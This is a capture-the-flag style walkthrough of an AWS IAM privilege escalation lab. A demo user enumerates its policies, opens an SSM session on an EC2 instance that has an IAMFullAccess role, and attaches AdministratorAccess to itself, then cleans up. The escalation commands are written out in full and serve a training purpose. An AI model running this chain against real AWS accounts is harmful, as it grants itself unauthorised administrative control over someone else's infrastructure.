# Solutions / Walk through

Lets start off by viewing what permissions are attached to our user.

Run the following commands while authenticated as demo.

```sh
aws iam list-attached-user-policies --user-name demo

aws iam list-user-policies --user-name demo
```

The permission AmazonEC2FullAccess grants us full access to aws [EC2](https://console.aws.amazon.com/ec2/v2/home), lets look at the other permissions we have.

We have already seen what ***consolePassword*** does, lets look what ***ec2-permission*** does.

```sh
aws iam get-user-policy --user-name demo --policy-name ec2-permission
```

```json
{
    "Action": [
        "iam:PassRole",
        "iam:AttachRolePolicy",
        "ssm:StartSession"
    ],
    "Effect": "Allow",
    "Resource": "*"
}
```

The iam permissions (PassRole & AttachRolePolicy) allow us to grant roles to services and grants permission to attach a managed policy to the specified IAM role.

Lets look at **ssm:StartSession** this lets us initiate a connection to specified targets.

Lets look to see what EC2 instances we can connect to.

```sh
aws ec2 describe-instances
```

We can see from the output that there is an already existing server.

```sh
aws ec2 describe-instances | jq -r '.Reservations[0].Instances[0].InstanceId'
# i-58008eeeca3974041

aws ec2 describe-instances | jq -r '.Reservations[0].Instances[0].IamInstanceProfile.Arn'
# arn:aws:iam::0123456789:instance-profile/AdministrativeRoleProfile
```

Lets look into that instance profile **AdministrativeRoleProfile**.

```sh
aws iam list-instance-profiles

aws iam list-instance-profiles | jq -r '.InstanceProfiles[0].Roles[0].RoleName'
# EC2-demo-role

aws iam get-role --role-name EC2-demo-role

aws iam list-attached-role-policies --role-name EC2-demo-role
```

```json
{
    "AttachedPolicies": [
        {
            "PolicyName": "AmazonEC2RoleforSSM",
            "PolicyArn": "arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM"
        },
        {
            "PolicyName": "IAMFullAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/IAMFullAccess"
        },
        {
            "PolicyName": "AmazonSSMManagedInstanceCore",
            "PolicyArn": "arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore"
        }
    ]
}
```

Here we see SSM again and iam full access 😋

Lets connect to the instance

```sh
aws ec2 describe-instances | jq -r '.Reservations[0].Instances[0].InstanceId'
# i-58008eeeca3974041

aws ssm start-session --target i-58008eeeca3974041
```

We got a shell, in it we will have all the permissions that role has, full iam. Lets grant our own user admin.

```sh
aws iam attach-user-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --user-name demo
```

Our user now has full iam permissions, lets give ourself administrative permissions.

```sh
aws iam list-attached-user-policies --user-name demo
```

The demo user now has administrator permissions in this aws account. ◻

## Cleanup

Lets remove the policies we attached and then let terraform do the rest.

```sh
aws iam detach-user-policy --user-name demo --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## AWS Console

All of the following can be done in the web console as well.

Run the following command.

```sh
aws iam create-login-profile --user-name demo --password 'My!User1Login8P@ssword'
```

Navigate to [console.aws.amazon.com](console.aws.amazon.com) choose IAM login, account id is in the terraform output [*account_id*], username is **demo** and password is **My!User1Login8P@ssword**
